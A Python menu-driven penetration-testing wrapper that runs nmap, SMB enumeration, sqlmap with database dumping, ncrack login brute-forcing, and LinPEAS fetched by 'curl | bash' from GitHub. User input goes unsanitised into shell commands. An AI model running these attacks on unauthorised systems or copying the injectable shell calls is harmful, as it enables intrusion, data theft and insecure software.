#!/usr/bin/env python3
import subprocess, sys, time, shutil, re, json, os, datetime
import urllib.request, urllib.parse


### CORE - RUN SYSTEM COMMANDS AND RETURN THE OUTPUT


def require_tool(name):
    # Check if a tool is installed, return FALSE if not.
    if not shutil.which(name):
        print(f"[!] {name} is not installed.  ->  apt install {name}")
        return False
    return True

def run_command(command):
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
    print(result.stdout)
    return result.returncode, result.stdout


### REPORT STRUCTURE FOR .TXT FULL SCAN REPORT - HEADER / TARGET / TIMESTAMP


ANSI_ESCAPE = re.compile(r"\033\[[0-9;]*m")

def strip_ansi(text):
    return ANSI_ESCAPE.sub("", text)

def save_report(content, host):
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename  = f"scan_{host}_{timestamp}.txt"
    sep       = "=" * 60
    header    = sep + "\n"
    header   += "  NETWORK PENTEST TOOL — Full Scan Report\n"
    header   += f"  Target  : {host}\n"
    header   += f"  Date    : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    header   += "  By The Bugs\n"
    header   += sep + "\n\n"
    with open(filename, "w") as f:
        f.write(header)
        f.write(strip_ansi(content))
    print(f"\n[+] Report saved → {os.path.abspath(filename)}")


### VALIDATION - ENSURES USER INPUT IS LEGIT AND NOT MALICIOUS


def is_valid_host(host):
    return bool(re.match(r"^(\d{1,3}\.){3}\d{1,3}$", host) or re.match(r"^[a-zA-Z0-9\.\-]+$", host))

def is_valid_url(url):
    return url.startswith("http://") or url.startswith("https://")

def get_host(prompt="Enter target host: "):
    host = input(prompt).strip()
    if not is_valid_host(host):
        print("[!] Invalid host. Use an IP address or a valid hostname.")
        return None
    return host

def get_url(prompt="Enter target URL: "):
    url = input(prompt).strip()
    if not is_valid_url(url):
        print("[!] Invalid URL. Must start with http:// or https://")
        return None
    return url


### NETWORK TOOLS - FUNCTIONS FOR EVERY TOOL


def check_interfaces():
    print("\n == Checking network interfaces ==")
    time.sleep(1)
    run_command("ifconfig" if shutil.which("ifconfig") else "ip address")

def ping_host():
    host = get_host("Enter host to ping: ")
    if not host: return None
    count = input("Enter number of pings: ").strip()
    if not count.isdigit() or not (0 < int(count) <= 100):
        print("[!] Invalid count. Must be a number between 1 and 100.")
        return None
    print(f"\n == Pinging {host} {count} times ==")
    time.sleep(1)
    up = subprocess.run(f"ping -c {count} -w 1 {host}", shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
    print(f"[+] {host} is UP" if up else f"[-] {host} is DOWN or unreachable")
    return host

def nmap_scan(host=None):
    host = host or get_host("Enter host to scan with Nmap: ")
    if not host: return
    print(f"\n == Nmap Port Scan → {host} ==")
    time.sleep(1)
    run_command(f"nmap -sV {host}")

def routing_table():
    print("\n == Routing Table ==")
    time.sleep(1)
    run_command("ip route show")

def traceroute_host():
    host = get_host("Enter host for traceroute: ")
    if not host: return
    print(f"\n == Traceroute → {host} ==")
    time.sleep(1)
    run_command(f"traceroute {host}")

def arp_nmap():
    # ARP HOST DISCOVERY WITH NMAP -PR AND -SN FOR HOST ONLY
    range_ = input("Enter network range (e.g. 192.168.1.0/24): ").strip()
    if not range_: print("[!] No range provided."); return
    print(f"\n == ARP Scan (nmap) → {range_} ==")
    time.sleep(1)
    run_command(f"nmap -PR -sn {range_}")

def smb_enum():
    # ENUM4LINUX -a RUNS ALL ENUMERATION: SHARES, USERS, GROUPS, OS INFO, PASSWORD POLICY
    host = get_host("Enter target host: ")
    if not host: return
    if not require_tool("enum4linux"): return
    print(f"\n == SMB Enumeration (enum4linux) → {host} ==")
    run_command(f"enum4linux -a {host}")


### CVE LOOKUP - FOR OS DETECTED: NMAP VULN / CVE / NIST API


OS_CVE_MAP = {
    "windows 7":           [("CVE-2017-0144", "EternalBlue - RCE via SMBv1", "CRITICAL"),
                            ("CVE-2017-0145", "EternalRomance - SMBv1",      "CRITICAL"),
                            ("CVE-2019-0708", "BlueKeep - RDP RCE",          "CRITICAL")],
    "windows xp":          [("CVE-2008-4250", "MS08-067 - NetAPI RCE",       "CRITICAL"),
                            ("CVE-2017-0144", "EternalBlue - SMBv1 RCE",     "CRITICAL")],
    "windows 10":          [("CVE-2021-34527","PrintNightmare - RCE",        "CRITICAL"),
                            ("CVE-2021-1675", "PrintNightmare (LPE)",        "HIGH")],
    "windows server 2008": [("CVE-2017-0144", "EternalBlue - SMBv1 RCE",    "CRITICAL"),
                            ("CVE-2019-0708", "BlueKeep - RDP RCE",         "CRITICAL")],
    "linux 2.6":           [("CVE-2016-5195", "DirtyCOW - Privilege Escalation", "HIGH")],
    "ubuntu":              [("CVE-2021-3156", "Sudo Baron Samedit - LPE",   "HIGH")],
    "android":             [("CVE-2019-2215", "Binder UAF - LPE",           "HIGH")],
}

SEVERITY_COLOR = {"CRITICAL": "\033[91m", "HIGH": "\033[93m", "MEDIUM": "\033[94m", "LOW": "\033[92m"}
RESET = "\033[0m"

def detect_os_from_nmap(nmap_output):
    for pattern in [r"OS details:\s*(.+)", r"Aggressive OS guesses:\s*(.+?)(?:\s*\(|\n)", r"Running:\s*(.+)"]:
        m = re.search(pattern, nmap_output, re.IGNORECASE)
        if m: return m.group(1).strip()
    return None

def match_os_to_map(detected_os):
    if not detected_os: return []
    return [c for k, v in OS_CVE_MAP.items() if k in detected_os.lower() for c in v]

def fetch_cves_from_nvd(keyword, max_results=5):
    try:
        url = (f"https://services.nvd.nist.gov/rest/json/cves/2.0"
               f"?keywordSearch={urllib.parse.quote(keyword)}&resultsPerPage={max_results}")
        req = urllib.request.Request(url, headers={"User-Agent": "NetworkTool/1.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read().decode())
        results = []
        for item in data.get("vulnerabilities", []):
            cve      = item.get("cve", {})
            cve_id   = cve.get("id", "N/A")
            desc     = next((d["value"] for d in cve.get("descriptions", []) if d["lang"] == "en"), "No description")
            desc     = desc[:80] + "..." if len(desc) > 80 else desc
            metrics  = cve.get("metrics", {})
            severity = "UNKNOWN"
            for v in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
                if v in metrics:
                    severity = metrics[v][0].get("cvssData", {}).get("baseSeverity", "UNKNOWN")
                    break
            results.append((cve_id, desc, severity))
        return results
    except Exception as e:
        print(f"  [!] NVD API error: {e}"); return []

def display_cves(cves, source=""):
    if not cves: print("  [*] No CVEs found."); return
    priority = [c for c in cves if c[2].upper() in ("CRITICAL", "HIGH")]
    lower    = [c for c in cves if c[2].upper() in ("MEDIUM", "LOW", "UNKNOWN")]
    if not priority and lower:
        print(f"  [*] No CRITICAL or HIGH CVEs found.")
        print(f"  [i] {len(lower)} lower-severity CVE(s) (MEDIUM/LOW) were omitted."); return
    if source: print(f"\n  Source: {source}")
    print(f"  {'CVE ID':<20} {'Severity':<10} Description")
    print("  " + "─" * 70)
    for cve_id, desc, severity in priority:
        print(f"  {SEVERITY_COLOR.get(severity.upper(), '')}{cve_id:<20} {severity:<10}{RESET} {desc}")
    if lower:
        print(f"  \033[90m[i] {len(lower)} lower-severity CVE(s) omitted (MEDIUM/LOW)\033[0m")

def extract_services(nmap_output):
    # Extract unique service names from nmap -sV output (e.g. ssh, http, smb)
    seen, unique = set(), []
    for s in re.findall(r"\d+/tcp\s+open\s+(\S+)", nmap_output, re.IGNORECASE):
        s = s.lower()
        if s not in seen: seen.add(s); unique.append(s)
    return unique

def cve_lookup(detected_os, host, _lines=None):
    print("\n\n╔══════════════════════════════════════╗")
    print("║         CVE VULNERABILITY SCAN       ║")
    print("╚══════════════════════════════════════╝")
    out = []

    msg = f"\n[+] Detected OS: {detected_os}" if detected_os else "\n[!] Could not detect OS automatically."
    print(msg); out.append(strip_ansi(msg))

    local_cves = match_os_to_map(detected_os)
    if local_cves:
        print("\n[+] Known CVEs for this OS (local database):")
        out.append("\n[+] Known CVEs for this OS (local database):")
        display_cves(local_cves, source="Local OS Map")
        for c in local_cves: out.append(f"  {c[0]:<20} {c[2]:<10} {c[1]}")

    print(f"\n[+] Running Nmap vulnerability scripts on {host}...")
    out.append(f"\n[+] Running Nmap vulnerability scripts on {host}...")
    print("    (This may take a while...)")
    time.sleep(1)
    _, vuln_out = run_command(f"nmap -sV --script vuln {host}")
    out.append(vuln_out)

    nmap_cves = re.findall(r"CVE-\d{4}-\d+", vuln_out)
    if nmap_cves:
        print("\n[+] CVEs found by Nmap scripts:")
        out.append("\n[+] CVEs found by Nmap scripts:")
        for cve in set(nmap_cves):
            print(f"  \033[91m{cve}\033[0m"); out.append(f"  {cve}")

    if not detected_os:
        msg = "\n[-] Skipping NVD lookup — OS not detected."
        print(msg); out.append(msg)
        if _lines is not None: _lines.extend(out)
        return

    os_label = " ".join(detected_os.split()[:3])
    services  = extract_services(vuln_out)

    if services:
        print("\n[+] Fetching CVEs from NIST NVD for each open service...")
        out.append("\n[+] NVD CVE Lookup:")
        for svc in services:
            query = f"{os_label} {svc}"
            print(f"\n  → Query: '{query}'"); out.append(f"\n  Query: {query}")
            nvd_cves = fetch_cves_from_nvd(query, max_results=3)
            display_cves(nvd_cves, source=f"NVD — {query}")
            for c in nvd_cves: out.append(f"  {c[0]:<20} {c[2]:<10} {c[1]}")
    else:
        print(f"\n[+] No services detected. Fetching CVEs for OS: '{os_label}'")
        out.append(f"\n[+] No services detected. Fetching CVEs for OS: '{os_label}'")
        nvd_cves = fetch_cves_from_nvd(os_label)
        display_cves(nvd_cves, source=f"NVD — {os_label}")
        for c in nvd_cves: out.append(f"  {c[0]:<20} {c[2]:<10} {c[1]}")

    if _lines is not None: _lines.extend(out)


### TOOL MENUS


def _menu_loop(title, options, back_key):
    while True:
        print(f"\n\n╔══════════════════════════════════════╗")
        print(f"║  {title:<36}║")
        print(f"╚══════════════════════════════════════╝")
        for key, (label, _) in options.items(): print(f"  {key}) {label}")
        choice = input("\nChoose an option: ").strip()
        if choice == back_key: break
        elif choice in options and options[choice][1]: options[choice][1]()
        else: print("[!] Invalid option.")

def scanning_menu():
    _menu_loop("SCANNING MENU", {
        "1": ("Ping a Host",         ping_host),
        "2": ("Port Scan with Nmap", nmap_scan),
        "3": ("ARP Nmap",            arp_nmap),
        "4": ("Traceroute",          traceroute_host),
        "5": ("Routing Table",       routing_table),
        "6": ("SMB Enumeration",     smb_enum),
        "7": ("Back",                None),
    }, "7")

def sqlmap_scan():
    if not shutil.which("sqlmap"): print("[!] sqlmap is not installed.  →  install sqlmap"); return
    url = get_url("Enter target URL (e.g. http://site.com/): ")
    if not url: return
    print("\n  Scan profile:")
    print("    1) Quick      (--level=1 --risk=1)")
    print("    2) Medium     (--level=3 --risk=2 --dbs)")
    print("    3) Aggressive (--level=5 --risk=3 --dbs --dump)")
    flags = {"1": "--level=1 --risk=1 --batch", "2": "--level=3 --risk=2 --dbs --batch",
             "3": "--level=5 --risk=3 --dbs --dump --batch"}.get(
             input("  Choose profile (1-3): ").strip(), "--level=1 --risk=1 --batch")
    print(f"\n == SQLMap → {url} ==")
    run_command(f'sqlmap -u "{url}" {flags}')

def nikto_scan():
    if not shutil.which("nikto"): print("[!] nikto is not installed.  →  install nikto"); return
    url = get_url("Enter target URL: ")
    if not url: return
    print(f"\n == Nikto → {url} ==\n  (This may take a while...)")
    run_command(f"nikto -h {url}")

def gobuster_scan():
    if not shutil.which("gobuster"): print("[!] gobuster is not installed.  →  install gobuster"); return
    url = get_url("Enter target URL: ")
    if not url: return
    wordlist = input("Wordlist path (Enter for default): ").strip()
    if not wordlist:
        wordlist = next((w for w in ["/usr/share/wordlists/dirb/common.txt",
                                     "/usr/share/dirb/wordlists/common.txt"] if os.path.exists(w)), None)
        if not wordlist: print("[!] No default wordlist found. Please provide a path."); return
    print(f"\n == Gobuster → {url} ==")
    run_command(f"gobuster dir -u {url} -w {wordlist} -t 50")

def whatweb_scan():
    if not shutil.which("whatweb"): print("[!] whatweb is not installed.  →  install whatweb"); return
    url = get_url("Enter target URL: ")
    if not url: return
    print(f"\n == WhatWeb → {url} ==")
    run_command(f"whatweb -a 3 {url}")

def web_tools_menu():
    _menu_loop("WEB ATTACK & RECON TOOLS", {
        "1": ("SQLMap   — SQL Injection",            sqlmap_scan),
        "2": ("Nikto    — Web Vulnerability Scanner", nikto_scan),
        "3": ("Gobuster — Directory Bruteforce",      gobuster_scan),
        "4": ("WhatWeb  — Web Fingerprinting",        whatweb_scan),
        "5": ("Back",                                 None),
    }, "5")


### NCRACK BY NMAP — PASSWORD CRACKING TOOL: SUPPORTS SSH, RDP, FTP, TELNET


def ncrack_scan():
    if not shutil.which("ncrack"): print("[!] ncrack is not installed.  →  apt install ncrack"); return
    host = get_host("Enter target host: ")
    if not host: return
    print("\n  Protocol:  1) SSH (22)  2) RDP (3389)  3) FTP (21)  4) Telnet (23)")
    proto, port = {"1": ("ssh","22"), "2": ("rdp","3389"),
                   "3": ("ftp","21"), "4": ("telnet","23")}.get(
                   input("  Choose protocol (1-4): ").strip(), (None, None))
    if not proto: print("[!] Invalid choice."); return
    # SECLISTS MIGHT NEED TO BE INSTALLED / -U USERNAME LIST -P PASSWORD LIST -V VERBOSE -F STOP AFTER FIRST
    user_list = input("Username list (Enter for default): ").strip() or \
                "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
    pass_list = input("Password list  (Enter for default): ").strip() or \
                "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
    print(f"\n == NCrack → {proto.upper()} on {host}:{port} ==\n  (This may take a while...)")
    run_command(f"ncrack -v -f -U {user_list} -P {pass_list} {proto}://{host}:{port}")

def ncrack_menu():
    _menu_loop("NCRACK — AUTH CRACKING", {
        "1": ("Run NCrack against a host", ncrack_scan),
        "2": ("Back",                      None),
    }, "2")


### LINPEAS — PRIVILEGE ESCALATION, RUN ONLY LOCAL!!
# CURL OPTION FOR REMOTE REQUIRES INTERNET ACCESS ON TARGET MACHINE


def linpeas_local():
    # Runs a local copy of linpeas.sh already present on the machine
    path = input("Path to linpeas.sh (Enter for ./linpeas.sh): ").strip() or "./linpeas.sh"
    if not os.path.exists(path):
        print(f"[!] File not found: {path}")
        print("    Download with: wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh")
        return
    os.chmod(path, 0o755)
    print(f"\n == LinPEAS (local) → {path} ==\n  (This will take a few minutes...)")
    run_command(f"bash {path}")

def linpeas_curl():
    if not shutil.which("curl"): print("[!] curl is not installed.  →  install curl"); return
    print("\n == LinPEAS (via curl) ==\n  (This will take a few minutes...)")
    # -s = silent mode; output piped directly into bash
    run_command("curl -s https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash")

def linpeas_menu():
    # IMPORTANT: must be run ON the target machine
    _menu_loop("LINPEAS — PRIVILEGE ESCALATION", {
        "1": ("Run LinPEAS from local file",   linpeas_local),
        "2": ("Run LinPEAS via curl (remote)", linpeas_curl),
        "3": ("Back",                          None),
    }, "3")


### FULL SCAN - .TXT OUTPUT WITH REPORT PLUS CVE DATA


def full_scan(target=None):
    report_lines = []
    log = report_lines.append

    def run_and_log(command):
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        print(result.stdout); log(result.stdout)
        return result.returncode, result.stdout

    if target:
        # Remote mode — IP passed as argument, skip host discovery and ping
        host = target
        log(f"Step 1+2: Remote target — {host}\n")
        print(f"\n[*] Remote target: {host} — skipping host discovery and ping")
    else:
        log("Step 1: == Checking network interfaces ==\n")
        print("\nStep 1: == Checking network interfaces ==")
        run_and_log("ifconfig" if shutil.which("ifconfig") else "ip address")

        print("\nStep 2: == Ping host ==")
        host = ping_host()
        if not host: print("[!] No valid host. Aborting full scan."); return
        log(f"Step 2: Ping — {host} is UP\n")

    log("\nStep 3: == Nmap OS Detection + Port Scan ==\n")
    print("\nStep 3: == Nmap OS Detection + Port Scan ==")
    time.sleep(1)
    print(f"Running nmap OS detection on {host}...")
    _, nmap_output = run_and_log(f"nmap -O -sV {host}")
    detected_os = detect_os_from_nmap(nmap_output)
    if detected_os: log(f"Detected OS: {detected_os}\n")

    log("\nStep 4: == CVE Vulnerability Lookup ==\n")
    print("\nStep 4: == CVE Vulnerability Lookup ==")
    cve_lookup(detected_os, host, _lines=report_lines)
    save_report("\n".join(report_lines), host)


### MANUAL: INFO ON ALL THE TOOLS AND OPTIONS


MANUAL = {
    "Full Scan": [
        "Runs a full recon pipeline: network interface, ping, OS/Ports and CVE lookup.",
        "Saves output: clean .txt report at the end.",
    ],
    "Network Interfaces": [
        "Shows all network interfaces, IP/MAC addresses.",
        "Uses ifconfig if available, otherwise falls back to 'ip address'.",
        "Use to confirm your own IP if needed",
    ],
    "Scanning Menu": {
        "Ping": [
            "Sends ICMP packets to confirm if host is up or not, no port scan.",
            "Returns UP or DOWN",
        ],
        "Port Scan (Nmap)": [
            "Scans all common ports on the target with version detection (-sV).",
            "Results feed into the CVE lookup during a Full Scan.",
        ],
        "ARP Nmap": [
            "Discovers all live hosts on the local network using ARP ping (-PR).",
            "Requires a network range input (e.g. 192.168.1.0/24).",
        ],
        "Traceroute": [
            "Maps each hop between your machine and the target.",
            "High latency hops may indicate IDS/IPS or proxies.",
        ],
        "Routing Table": [
            "Displays the current IP routing table of your machine.",
            "Useful to confirm routing before scanning remote targets.",
        ],
        "SMB Enumeration": [
            "Runs enum4linux -a — shares, users, groups, OS info, password policy.",
            "Useful after initial access to map the network and find credentials.",
        ],
    },
    "Web Attack & Recon": {
        "SQLMap": [
            "Automated SQL injection detection and exploitation tool.",
            "Quick, Medium, Aggressive (increasing depth).",
            "Aggressive mode dumps the full database.",
        ],
        "Nikto": [
            "Web server scanner that checks for known vulnerabilities.",
            "Noisy tool — NOT STEALTH!",
        ],
        "Gobuster": [
            "Bruteforces hidden directories and files on a web server.",
            "Uses a wordlist — default is dirb's common.txt.",
        ],
        "WhatWeb": [
            "Fingerprints the web: CMS, framework, server, plugins.",
            "Runs at aggression level 3 (active checks).",
        ],
    },
    "NCrack": [
        "Network authentication cracker for SSH, RDP, FTP, and Telnet.",
        "Uses username and password wordlists — defaults to SecLists.",
    ],
    "LinPEAS": [
        "Linux Privilege Escalation Script — run on the TARGET machine.",
        "Option 1: local file (linpeas.sh). Option 2: downloads and runs via curl.",
    ],
}

def print_manual_section(title, content, indent=0):
    pad = "  " * indent
    if isinstance(content, list):
        print(f"\n{pad}\033[93m{title}\033[0m")
        for line in content: print(f"{pad}  • {line}")
    elif isinstance(content, dict):
        print(f"\n{pad}\033[96m{title}\033[0m")
        for sub, val in content.items(): print_manual_section(sub, val, indent + 1)

def show_manual():
    sections = list(MANUAL.keys())
    while True:
        print("\n\n╔══════════════════════════════════════╗")
        print("║              MANUAL                  ║")
        print("╚══════════════════════════════════════╝")
        for i, name in enumerate(sections, 1): print(f"  {i}) {name}")
        print(f"  {len(sections) + 1}) Back")
        choice = input("\nChoose a section: ").strip()
        if choice == str(len(sections) + 1): break
        elif choice.isdigit() and 1 <= int(choice) <= len(sections):
            print_manual_section(sections[int(choice)-1], MANUAL[sections[int(choice)-1]])
            input("\n  Press Enter to continue...")
        else:
            print("[!] Invalid option.")


### MAIN MENU


def main():
    print("""
░█▀█░█▀▀░▀█▀░█░█░█▀█░█▀▄░█░█░░░█▀▀░█▀▀░█▀█░█▀█░░░▄▀░░░░█▀█░█▀▀░█▀█░░░▀█▀░█▀▀░█▀▀░▀█▀░░░▀█▀░█▀█░█▀█░█░░
░█░█░█▀▀░░█░░█▄█░█░█░█▀▄░█▀▄░░░▀▀█░█░░░█▀█░█░█░░░▄█▀░░░█▀▀░█▀▀░█░█░░░░█░░█▀▀░▀▀█░░█░░░░░█░░█░█░█░█░█░░
░▀░▀░▀▀▀░░▀░░▀░▀░▀▀▀░▀░▀░▀░▀░░░▀▀▀░▀▀▀░▀░▀░▀░▀░░░░▀▀░░░▀░░░▀▀▀░▀░▀░░░░▀░░▀▀▀░▀▀▀░░▀░░░░░▀░░▀▀▀░▀▀▀░▀▀▀
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█▀▄░█░█░░░▀█▀░█░█░█▀▀░░░█▀▄░█░█░█▀▀░█▀▀░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█▀▄░░█░░░░░█░░█▀█░█▀▀░░░█▀▄░█░█░█░█░▀▀█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▀▀░░░▀░░░░░▀░░▀░▀░▀▀▀░░░▀▀░░▀▀▀░▀▀▀░▀▀▀░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
""")
    print("  VERSION 3.0.0  |  By The Bugs  |  Circa 2026")

    menu = {
        "1": ("Full Scan (.txt report/CVE lookup)", full_scan),
        "2": ("Check Network Interface Info",       check_interfaces),
        "3": ("Scanning Menu             ►",        scanning_menu),
        "4": ("Web Attack & Recon Tools  ►",        web_tools_menu),
        "5": ("NCrack — Auth Cracking    ►",        ncrack_menu),
        "6": ("LinPEAS — Priv Escalation ►",        linpeas_menu),
        "7": ("Manual                    ►",        show_manual),
        "8": ("Exit",                               None),
    }

    while True:
        print("\n\n╔══════════════════════════════════════╗")
        print("║         NETWORK PENTEST TOOL         ║")
        print("╚══════════════════════════════════════╝")
        for key, (label, _) in menu.items(): print(f"  {key}) {label}")

        tool = input("\nChoose an option: ").strip()
        print("\nConnecting ...")

        if tool == "8":
            print("Disconnecting ..."); time.sleep(1); break
        elif tool in menu:
            menu[tool][1]()
        else:
            print("[!] Invalid option, please select 1-8."); continue

        print()
        if input("Do you want to pick another tool? (y/n): ").strip().lower() != "y":
            print("\nHope to see you again.\nDisconnecting ..."); break

if __name__ == "__main__":
    if len(sys.argv) > 1:
        # IP passed as argument — run full scan directly, skip menu
        print(f"[*] Target received: {sys.argv[1]}")
        full_scan(target=sys.argv[1])
    else:
        main()
